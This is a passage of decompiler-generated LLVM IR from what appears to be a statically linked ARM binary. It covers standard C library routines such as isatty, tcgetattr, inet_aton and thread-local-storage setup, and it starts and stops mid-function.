dec_label_pc_17ae4:                               ; preds = %dec_label_pc_17ae4.preheader, %dec_label_pc_17adc
  %v0_17aec = phi i32 [ %tmp, %dec_label_pc_17ae4.preheader ], [ %v1_17aec, %dec_label_pc_17adc ]
  %v1_17ae4 = inttoptr i32 %v0_17aec to i8*
  %v2_17ae4 = load i8, i8* %v1_17ae4, align 1
  %v2_17ae8 = icmp eq i8 %v2_17ae4, 0
  br i1 %v2_17ae8, label %dec_label_pc_17b10, label %dec_label_pc_17adc

dec_label_pc_17af8:                               ; preds = %dec_label_pc_17adc
  %v1_17af8 = add i32 %v0_17af8, 1
  %v1_17afc = add i32 %v0_17afc, 1
  %v1_17b00 = inttoptr i32 %v1_17afc to i8*
  %v2_17b00 = load i8, i8* %v1_17b00, align 1
  %v2_17b04 = icmp eq i8 %v2_17b00, 0
  br i1 %v2_17b04, label %dec_label_pc_17b10, label %dec_label_pc_17ae4.preheader

dec_label_pc_17ae4.preheader:                     ; preds = %entry, %dec_label_pc_17af8
  %v0_17afc = phi i32 [ %v1_17afc, %dec_label_pc_17af8 ], [ %v0_17b002, %entry ]
  %v0_17af8 = phi i32 [ %v1_17af8, %dec_label_pc_17af8 ], [ 0, %entry ]
  %v0_17adc10.in = phi i8 [ %v2_17b00, %dec_label_pc_17af8 ], [ %v2_17b004, %entry ]
  br label %dec_label_pc_17ae4

dec_label_pc_17b10:                               ; preds = %dec_label_pc_17af8, %dec_label_pc_17ae4, %entry
  %v0_17b10 = phi i32 [ 0, %entry ], [ %v0_17af8, %dec_label_pc_17ae4 ], [ %v1_17af8, %dec_label_pc_17af8 ]
  ret i32 %v0_17b10

; uselistorder directives
  uselistorder i8 %v2_17ae4, { 1, 0 }
  uselistorder i32 %v0_17aec, { 1, 0 }
  uselistorder label %dec_label_pc_17ae4.preheader, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_17b24 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_17b24, i32* @r1, align 4
  %v0_17b28 = call i32 @__GI_tcgetattr()
  %v1_17b2c = sub i32 1, %v0_17b28
  %v2_17b2c = icmp ult i32 %v0_17b28, 2
  br i1 %v2_17b2c, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_17b3c = phi i32 [ %v1_17b2c, %entry ], [ 0, %bb ]
  ret i32 %v1_17b3c

; uselistorder directives
  uselistorder i32 %v0_17b28, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_17b40 = load i32, i32* @r4, align 4
  %v6_17b40 = load i32, i32* @r5, align 4
  %v9_17b40 = load i32, i32* @r6, align 4
  %v2_17b48 = ptrtoint i32* %stack_var_-52 to i32
  %v0_17b4c = load i32, i32* @r1, align 4
  store i32 %v0_17b4c, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_17b58 = load i32, i32* @r0, align 4
  %v3_17b58 = call i32 @ioctl(i32 %v0_17b58, i32 21505, i32 %v2_17b48)
  store i32 %v3_17b58, i32* %r0.global-to-local, align 4
  store i32 %v3_17b58, i32* @r5, align 4
  %v2_17b5c = icmp eq i32 %v3_17b58, 0
  br i1 %v2_17b5c, label %dec_label_pc_17b64, label %dec_label_pc_17ba8

dec_label_pc_17b64:                               ; preds = %entry
  %v4_17b70 = zext i8 %tmp to i32
  store i32 %v4_17b70, i32* @ip, align 4
  %v3_17b74 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_17b74, i32* @r3, align 4
  %v1_17b78 = load i32, i32* @r4, align 4
  %v2_17b78 = add i32 %v1_17b78, 4
  %v3_17b78 = inttoptr i32 %v2_17b78 to i32*
  %v0_17b7c = load i32, i32* %r1.global-to-local, align 4
  %v1_17b7c = load i32, i32* @r4, align 4
  %v2_17b7c = add i32 %v1_17b7c, 8
  %v3_17b7c = inttoptr i32 %v2_17b7c to i32*
  store i32 %v0_17b7c, i32* %v3_17b7c, align 4
  %v0_17b80 = load i32, i32* %r0.global-to-local, align 4
  %v1_17b80 = load i32, i32* @r4, align 4
  %v2_17b80 = add i32 %v1_17b80, 12
  %v3_17b80 = inttoptr i32 %v2_17b80 to i32*
  store i32 %v0_17b80, i32* %v3_17b80, align 4
  %v2_17b84 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_17b84, i32* @r1, align 4
  %v1_17b8c = load i32, i32* @r4, align 4
  %v2_17b8c = inttoptr i32 %v1_17b8c to i32*
  store i32 %v3_17b74, i32* %v2_17b8c, align 4
  %v0_17b90 = load i32, i32* @ip, align 4
  %v1_17b90 = trunc i32 %v0_17b90 to i8
  %v2_17b90 = load i32, i32* @r4, align 4
  %v3_17b90 = add i32 %v2_17b90, 16
  %v4_17b90 = inttoptr i32 %v3_17b90 to i8*
  store i8 %v1_17b90, i8* %v4_17b90, align 1
  %v0_17b94 = load i32, i32* @r4, align 4
  %v1_17b94 = add i32 %v0_17b94, 17
  store i32 %v1_17b94, i32* %r0.global-to-local, align 4
  %v4_17b98 = call i32 @__GI_mempcpy(i32 %v1_17b94, i32 %v2_17b84, i32 19, i32 %v3_17b74)
  store i32 %v4_17b98, i32* %r0.global-to-local, align 4
  %v0_17b9c = load i32, i32* @r5, align 4
  store i32 %v0_17b9c, i32* %r1.global-to-local, align 4
  %v3_17ba4 = inttoptr i32 %v4_17b98 to i8*
  %v4_17ba4 = call i32 @__GI_memset(i8* %v3_17ba4, i32 %v0_17b9c, i32 13)
  store i32 %v4_17ba4, i32* %r0.global-to-local, align 4
  %v0_17ba8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17ba8

dec_label_pc_17ba8:                               ; preds = %entry, %dec_label_pc_17b64
  %v0_17ba8 = phi i32 [ %v3_17b58, %entry ], [ %v0_17ba8.pre, %dec_label_pc_17b64 ]
  store i32 %v0_17ba8, i32* %r0.global-to-local, align 4
  store i32 %v3_17b40, i32* @r4, align 4
  store i32 %v6_17b40, i32* @r5, align 4
  store i32 %v9_17b40, i32* @r6, align 4
  ret i32 %v0_17ba8

; uselistorder directives
  uselistorder i32 %v0_17ba8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 17, { 16, 1, 4, 19, 20, 5, 21, 17, 18, 6, 7, 8, 9, 10, 11, 22, 12, 23, 13, 24, 25, 14, 26, 15, 2, 27, 3, 28, 29, 30, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17ba8, { 1, 0 }
}

define i32 @inet_aton() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_17bbc = load i32, i32* @r4, align 4
  store i32 %v3_17bbc, i32* %stack_var_-28, align 4
  %v0_17bc4 = load i32, i32* @r0, align 4
  %v2_17bc4 = icmp eq i32 %v0_17bc4, 0
  %v0_17bcc = load i32, i32* @r1, align 4
  br i1 %v2_17bc4, label %dec_label_pc_17ca0, label %dec_label_pc_17bd4

dec_label_pc_17bd4:                               ; preds = %entry
  br label %dec_label_pc_17bec

dec_label_pc_17bec:                               ; preds = %dec_label_pc_17bd4, %dec_label_pc_17c64
  %v1_17c64 = phi i32 [ 0, %dec_label_pc_17bd4 ], [ %v5_17c64, %dec_label_pc_17c64 ]
  %v0_17c68 = phi i32 [ 1, %dec_label_pc_17bd4 ], [ %v1_17c68, %dec_label_pc_17c64 ]
  %v0_17bec = phi i32 [ %v0_17bc4, %dec_label_pc_17bd4 ], [ %v0_17bec13, %dec_label_pc_17c64 ]
  %v1_17bec = inttoptr i32 %v0_17bec to i8*
  %v2_17bec = load i8, i8* %v1_17bec, align 1
  %v3_17bec = zext i8 %v2_17bec to i32
  %v4_17bf0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 276) to i32*), align 4
  %v2_17bf4 = mul nuw nsw i32 %v3_17bec, 2
  %v2_17bf8 = add i32 %v2_17bf4, %v4_17bf0
  %v3_17bf8 = inttoptr i32 %v2_17bf8 to i16*
  %v4_17bf8 = load i16, i16* %v3_17bf8, align 2
  %v1_17bfc = and i16 %v4_17bf8, 8
  %v2_17bfc = icmp eq i16 %v1_17bfc, 0
  br i1 %v2_17bfc, label %dec_label_pc_17ca0, label %dec_label_pc_17c04

dec_label_pc_17c04:                               ; preds = %dec_label_pc_17bec
  br label %dec_label_pc_17c24

dec_label_pc_17c0c:                               ; preds = %dec_label_pc_17c24
  %v2_17c0c = mul i32 %v0_17c64, 10
  %v1_17c10 = add i32 %v2_17c0c, -48
  %v2_17c14 = add i32 %v3_17c24, %v1_17c10
  %v8_17c1c = icmp sgt i32 %v2_17c14, 255
  br i1 %v8_17c1c, label %dec_label_pc_17ca0, label %dec_label_pc_17c20

dec_label_pc_17c20:                               ; preds = %dec_label_pc_17c0c
  %v1_17c20 = add i32 %v0_17c54, 1
  store i32 %v1_17c20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17c24

dec_label_pc_17c24:                               ; preds = %dec_label_pc_17c04, %dec_label_pc_17c20
  %v0_17c64 = phi i32 [ 0, %dec_label_pc_17c04 ], [ %v2_17c14, %dec_label_pc_17c20 ]
  %v0_17c54 = phi i32 [ %v0_17bec, %dec_label_pc_17c04 ], [ %v1_17c20, %dec_label_pc_17c20 ]
  %v1_17c24 = inttoptr i32 %v0_17c54 to i8*
  %v2_17c24 = load i8, i8* %v1_17c24, align 1
  %v3_17c24 = zext i8 %v2_17c24 to i32
  %v2_17c28 = mul nuw nsw i32 %v3_17c24, 2
  %v2_17c2c = add i32 %v2_17c28, %v4_17bf0
  %v3_17c2c = inttoptr i32 %v2_17c2c to i16*
  %v4_17c2c = load i16, i16* %v3_17c2c, align 2
  %v6_17c2c = zext i16 %v4_17c2c to i32
  %v1_17c30 = and i32 %v6_17c2c, 8
  %v2_17c30 = icmp eq i32 %v1_17c30, 0
  br i1 %v2_17c30, label %dec_label_pc_17c38, label %dec_label_pc_17c0c

dec_label_pc_17c38:                               ; preds = %dec_label_pc_17c24
  %v7_17c38 = icmp eq i32 %v0_17c68, 4
  br i1 %v7_17c38, label %dec_label_pc_17c50, label %dec_label_pc_17c40

dec_label_pc_17c40:                               ; preds = %dec_label_pc_17c38
  %v7_17c40 = icmp eq i8 %v2_17c24, 46
  br i1 %v7_17c40, label %dec_label_pc_17c48, label %dec_label_pc_17ca0

dec_label_pc_17c48:                               ; preds = %dec_label_pc_17c40
  %v1_17c48 = add i32 %v0_17c54, 1
  store i32 %v1_17c48, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17c64

dec_label_pc_17c50:                               ; preds = %dec_label_pc_17c38
  %v2_17c50 = icmp eq i8 %v2_17c24, 0
  %v1_17c54 = add i32 %v0_17c54, 1
  store i32 %v1_17c54, i32* %r0.global-to-local, align 4
  br i1 %v2_17c50, label %dec_label_pc_17c64, label %dec_label_pc_17c5c

dec_label_pc_17c5c:                               ; preds = %dec_label_pc_17c50
  %v1_17c5c = and i32 %v6_17c2c, 32
  %v2_17c5c = icmp eq i32 %v1_17c5c, 0
  br i1 %v2_17c5c, label %dec_label_pc_17ca0, label %dec_label_pc_17c64

dec_label_pc_17c64:                               ; preds = %dec_label_pc_17c5c, %dec_label_pc_17c50, %dec_label_pc_17c48
  %v0_17bec13 = phi i32 [ %v1_17c54, %dec_label_pc_17c5c ], [ %v1_17c54, %dec_label_pc_17c50 ], [ %v1_17c48, %dec_label_pc_17c48 ]
  %v4_17c64 = mul i32 %v1_17c64, 256
  %v5_17c64 = or i32 %v0_17c64, %v4_17c64
  %v1_17c68 = add nuw nsw i32 %v0_17c68, 1
  %v7_17c70 = icmp slt i32 %v1_17c68, 5
  br i1 %v7_17c70, label %dec_label_pc_17bec, label %dec_label_pc_17c74

dec_label_pc_17c74:                               ; preds = %dec_label_pc_17c64
  %v2_17c74 = icmp eq i32 %v0_17bcc, 0
  br i1 %v2_17c74, label %.thread8.thread, label %bb

.thread8.thread:                                  ; preds = %dec_label_pc_17c74
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17ca4

bb:                                               ; preds = %dec_label_pc_17c74
  %v4_17c78 = udiv i32 %v5_17c64, 16777216
  %v2_17c7c = udiv i32 %v5_17c64, 256
  %v5_17c80 = and i32 %v2_17c7c, 65280
  %v2_17c84 = and i32 %v5_17c64, ptrtoint (i32* @global_var_ff00.34 to i32)
  %v5_17c88 = mul i32 %v2_17c84, 256
  %v5_17c8c = mul i32 %v0_17c64, 16777216
  %v6_17c80 = or i32 %v4_17c78, %v5_17c8c
  %v6_17c88 = or i32 %v6_17c80, %v5_17c80
  %v6_17c8c = or i32 %v6_17c88, %v5_17c88
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_17c98 = inttoptr i32 %v0_17bcc to i32*
  store i32 %v6_17c8c, i32* %v3_17c98, align 4
  %v2_17ca4.pre = load i32, i32* %stack_var_-28, align 4
  %v1_17ca8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17ca4

dec_label_pc_17ca0:                               ; preds = %dec_label_pc_17c40, %dec_label_pc_17c5c, %dec_label_pc_17bec, %dec_label_pc_17c0c, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17ca4

dec_label_pc_17ca4:                               ; preds = %.thread8.thread, %bb, %dec_label_pc_17ca0
  %v1_17ca8 = phi i32 [ %v1_17ca8.pre, %bb ], [ 0, %dec_label_pc_17ca0 ], [ 1, %.thread8.thread ]
  %v2_17ca4 = phi i32 [ %v2_17ca4.pre, %bb ], [ %v3_17bbc, %dec_label_pc_17ca0 ], [ %v3_17bbc, %.thread8.thread ]
  store i32 %v2_17ca4, i32* @r4, align 4
  ret i32 %v1_17ca8

; uselistorder directives
  uselistorder i32 %v1_17c68, { 1, 0 }
  uselistorder i32 %v5_17c64, { 2, 0, 1, 3 }
  uselistorder i32 %v0_17c54, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_ff00.34 to i32), { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 65280, { 1, 2, 10, 3, 0, 4, 11, 12, 13, 14, 15, 16, 17, 18, 47, 19, 20, 21, 22, 23, 5, 48, 24, 25, 6, 26, 49, 44, 27, 28, 29, 30, 31, 45, 7, 50, 46, 8, 51, 9, 32, 33, 52, 34, 35, 36, 37, 38, 39, 53, 40, 41, 42, 43 }
  uselistorder i8 46, { 0, 1, 3, 2 }
  uselistorder i32 255, { 4, 5, 0, 1, 2, 6, 3 }
  uselistorder i16 0, { 0, 1, 2, 7, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 5, 19, 6, 20, 21 }
  uselistorder i32 276, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17ca4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17ca0, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_17c24, { 1, 0 }
  uselistorder label %dec_label_pc_17bec, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_17cc0 = load i32, i32* @r4, align 4
  store i32 %v3_17cc0, i32* %stack_var_-16, align 4
  %v4_17cc4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_17ccc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_17cd4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 36) to i32*), align 4
  store i32 %v4_17cd4, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_17cdc = inttoptr i32 %v4_17cc4 to i32*
  %v2_17cdc = load i32, i32* %v1_17cdc, align 4
  %v4_17ce0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 52) to i32*), align 4
  store i32 %v4_17ce0, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_17ce8 = add i32 %v2_17cdc, 15
  %v4_17cec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 144) to i32*), align 4
  store i32 %v4_17cec, i32* @ip, align 4
  %v1_17cf0 = load i32, i32* @r0, align 4
  %v2_17cf0 = add i32 %v1_17cf0, %v1_17ce8
  %v1_17cf4 = inttoptr i32 %v4_17ccc to i32*
  %v2_17cf4 = load i32, i32* %v1_17cf4, align 4
  store i32 %v2_17cf4, i32* %r3.global-to-local, align 4
  %v1_17cf8 = and i32 %v2_17cf0, -16
  store i32 %v1_17cf8, i32* %v1_17cdc, align 4
  %v0_17d00 = load i32, i32* @r0, align 4
  %v1_17d00 = load i32, i32* %r4.global-to-local, align 4
  %v2_17d00 = inttoptr i32 %v1_17d00 to i32*
  store i32 %v0_17d00, i32* %v2_17d00, align 4
  %v0_17d04 = load i32, i32* @r1, align 4
  %v1_17d04 = load i32, i32* %lr.global-to-local, align 4
  %v2_17d04 = inttoptr i32 %v1_17d04 to i32*
  store i32 %v0_17d04, i32* %v2_17d04, align 4
  %v0_17d08 = load i32, i32* %r3.global-to-local, align 4
  %v1_17d08 = load i32, i32* @ip, align 4
  %v2_17d08 = inttoptr i32 %v1_17d08 to i32*
  store i32 %v0_17d08, i32* %v2_17d08, align 4
  %v2_17d0c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17d0c, i32* %r4.global-to-local, align 4
  %v1_17d10 = load i32, i32* @r0, align 4
  ret i32 %v1_17d10

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
}

define i32 @function_17d18(i32 %arg1) local_unnamed_addr {
dec_label_pc_17d18:
  %v0_17d18 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17d18, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17d18
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_17d18, %bb
  %v4_17d28 = phi i32 [ %arg1, %dec_label_pc_17d18 ], [ 0, %bb ]
  ret i32 %v4_17d28

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r3.global-to-local, align 4
  %v4_17d3c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 84) to i32*), align 4
  store i32 %v4_17d3c, i32* @lr, align 4
  %v4_17d48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 10748) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 10748), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_17d68 = inttoptr i32 %v4_17d48 to i32*
  store i32 1, i32* %v2_17d68, align 4
  %v0_17d6c = load i32, i32* %r3.global-to-local, align 4
  %v1_17d6c = load i32, i32* @lr, align 4
  %v2_17d6c = inttoptr i32 %v1_17d6c to i32*
  store i32 %v0_17d6c, i32* %v2_17d6c, align 4
  %v0_17d70 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_17d88(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17d88:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_17d88 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17d88, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17d88
  %v2_17d88 = load i32, i32* @r4, align 4
  %v8_17d88 = ashr i32 %v2_17d88, %tmp
  %v9_17d88 = and i32 %v8_17d88, %tmp
  %v2_17d8c = load i32, i32* @ip, align 4
  %v8_17d8c = lshr i32 %v2_17d8c, %v9_17d88
  %v9_17d8c = and i32 %v8_17d8c, %v9_17d88
  store i32 %v9_17d8c, i32* %r0.global-to-local, align 4
  %v4_17d90 = inttoptr i32 %v9_17d8c to i32*
  store i32 %arg2, i32* %v4_17d90, align 4
  %v5_17d90 = load i32, i32* @ip, align 4
  %v6_17d90 = load i32, i32* %r0.global-to-local, align 4
  %v7_17d90 = sub i32 %v6_17d90, %v5_17d90
  store i32 %v7_17d90, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17d88, %bb
  %v8_17d90 = phi i32 [ %tmp, %dec_label_pc_17d88 ], [ %v7_17d90, %bb ]
  ret i32 %v8_17d90

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_17d9c = call i32 @__aeabi_read_tp()
  %v1_17da0 = inttoptr i32 %v0_17d9c to i32*
  %v2_17da0 = load i32, i32* %v1_17da0, align 4
  %v1_17da4 = add i32 %arg1, 4
  %v2_17da4 = inttoptr i32 %v1_17da4 to i32*
  %v3_17da4 = load i32, i32* %v2_17da4, align 4
  %v1_17da8 = add i32 %v2_17da0, 8
  %v2_17da8 = inttoptr i32 %v1_17da8 to i32*
  %v3_17da8 = load i32, i32* %v2_17da8, align 4
  %v2_17dac = add i32 %v3_17da8, %v3_17da4
  ret i32 %v2_17dac
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_17db8 = load i32, i32* @r4, align 4
  store i32 %v3_17db8, i32* %stack_var_-36, align 4
  %v6_17db8 = load i32, i32* @r5, align 4
  %v15_17db8 = load i32, i32* @r8, align 4
  %v18_17db8 = load i32, i32* @sb, align 4
  %v21_17db8 = load i32, i32* @sl, align 4
  %v24_17db8 = load i32, i32* @fp, align 4
  %v27_17db8 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %sl.global-to-local, align 4
  %v4_17dc8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 104) to i32*), align 4
  store i32 %v4_17dc8, i32* %r3.global-to-local, align 4
  %v1_17dcc = inttoptr i32 %v4_17dc8 to i32*
  %v2_17dcc = load i32, i32* %v1_17dcc, align 4
  store i32 %v2_17dcc, i32* %r2.global-to-local, align 4
  %v2_17dd0 = icmp eq i32 %v2_17dcc, 0
  %v0_17dd8 = load i32, i32* %r0.global-to-local, align 4
  %v0_17ddc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_17ddc, i32* %ip.global-to-local, align 4
  br i1 %v2_17dd0, label %dec_label_pc_17fa4, label %dec_label_pc_17de4

dec_label_pc_17de4:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_17de8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 156) to i32*), align 4
  store i32 %v4_17de8, i32* @lr, align 4
  store i32 %v2_17dcc, i32* %r1.global-to-local, align 4
  %v1_17e30 = inttoptr i32 %v4_17de8 to i32*
  %v2_17e3061 = load i32, i32* %v1_17e30, align 4
  %v4_17e3462 = mul i32 %v2_17e3061, 32
  %v5_17e3463 = add i32 %v4_17e3462, %v2_17dcc
  store i32 %v5_17e3463, i32* %r3.global-to-local, align 4
  %v3_17e3865 = icmp ult i32 %v2_17dcc, %v5_17e3463
  br i1 %v3_17e3865, label %dec_label_pc_17df4, label %dec_label_pc_17fa4.loopexit

dec_label_pc_17df4:                               ; preds = %dec_label_pc_17de4, %dec_label_pc_17e2c
  %v0_17e0c66 = phi i32 [ %v1_17e2c, %dec_label_pc_17e2c ], [ %v2_17dcc, %dec_label_pc_17de4 ]
  %v1_17df4 = inttoptr i32 %v0_17e0c66 to i32*
  %v2_17df4 = load i32, i32* %v1_17df4, align 4
  store i32 %v2_17df4, i32* %r3.global-to-local, align 4
  %v7_17df8 = icmp eq i32 %v2_17df4, 7
  br i1 %v7_17df8, label %dec_label_pc_17e00, label %dec_label_pc_17e2c

dec_label_pc_17e00:                               ; preds = %dec_label_pc_17df4
  %v1_17e00 = add i32 %v0_17e0c66, 20
  %v2_17e00 = inttoptr i32 %v1_17e00 to i32*
  %v3_17e00 = load i32, i32* %v2_17e00, align 4
  store i32 %v3_17e00, i32* %r3.global-to-local, align 4
  %v1_17e04 = add i32 %v0_17e0c66, 28
  %v2_17e04 = inttoptr i32 %v1_17e04 to i32*
  %v3_17e04 = load i32, i32* %v2_17e04, align 4
  store i32 %v3_17e04, i32* @r6, align 4
  %v1_17e0c = add i32 %v0_17e0c66, 16
  %v2_17e0c = inttoptr i32 %v1_17e0c to i32*
  %v3_17e0c = load i32, i32* %v2_17e0c, align 4
  store i32 %v3_17e0c, i32* %r3.global-to-local, align 4
  %v1_17e10 = add i32 %v0_17e0c66, 8
  %v2_17e10 = inttoptr i32 %v1_17e10 to i32*
  %v3_17e10 = load i32, i32* %v2_17e10, align 4
  store i32 %v3_17e10, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_17e04, %v0_17ddc
  %v0_17ddc.v3_17e04 = select i1 %tmp78, i32 %v0_17ddc, i32 %v3_17e04
  store i32 %v0_17ddc.v3_17e04, i32* %fp.global-to-local, align 4
  %v2_17e48 = icmp eq i32 %v3_17e04, 0
  br i1 %v2_17e48, label %dec_label_pc_17e70, label %bb

dec_label_pc_17e2c:                               ; preds = %dec_label_pc_17df4
  %v1_17e2c = add i32 %v0_17e0c66, 32
  store i32 %v1_17e2c, i32* %r1.global-to-local, align 4
  %v2_17e30 = load i32, i32* %v1_17e30, align 4
  %v4_17e34 = mul i32 %v2_17e30, 32
  %v5_17e34 = add i32 %v4_17e34, %v2_17dcc
  store i32 %v5_17e34, i32* %r3.global-to-local, align 4
  %v3_17e38 = icmp ult i32 %v1_17e2c, %v5_17e34
  br i1 %v3_17e38, label %dec_label_pc_17df4, label %dec_label_pc_17e30.dec_label_pc_17fa4.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_17e00
  %v2_17e4c = add i32 %v3_17e04, -1
  br label %dec_label_pc_17e74

dec_label_pc_17e70:                               ; preds = %dec_label_pc_17e00, %dec_label_pc_17fa4
  %v0_17e84.pre = phi i32 [ %v0_17e84.pre.pre, %dec_label_pc_17fa4 ], [ ptrtoint (i32* @global_var_221d4.362 to i32), %dec_label_pc_17e00 ]
  %v1_17e74.pre = phi i32 [ %v1_17e74.pre.pre, %dec_label_pc_17fa4 ], [ %v0_17dd8, %dec_label_pc_17e00 ]
  %v1_17e9825 = phi i32 [ %v0_17fac, %dec_label_pc_17fa4 ], [ %v0_17ddc.v3_17e04, %dec_label_pc_17e00 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_17fa4 ], [ %v3_17e00, %dec_label_pc_17e00 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_17fa4 ], [ %v3_17e0c, %dec_label_pc_17e00 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_17fa4 ], [ %v3_17e10, %dec_label_pc_17e00 ]
  br label %dec_label_pc_17e74

dec_label_pc_17e74:                               ; preds = %bb, %dec_label_pc_17e70
  %storemerge80 = phi i32 [ %v2_17e4c, %bb ], [ 0, %dec_label_pc_17e70 ]
  %v0_17e74 = phi i32 [ %v2_17e4c, %bb ], [ 0, %dec_label_pc_17e70 ]
  %storemerge = phi i32 [ %v3_17e04, %bb ], [ 1, %dec_label_pc_17e70 ]
  %storemerge79 = phi i32 [ %v3_17e04, %bb ], [ 1, %dec_label_pc_17e70 ]
  %v0_17e84 = phi i32 [ ptrtoint (i32* @global_var_221d4.362 to i32), %bb ], [ %v0_17e84.pre, %dec_label_pc_17e70 ]
  %v1_17e74 = phi i32 [ %v0_17dd8, %bb ], [ %v1_17e74.pre, %dec_label_pc_17e70 ]
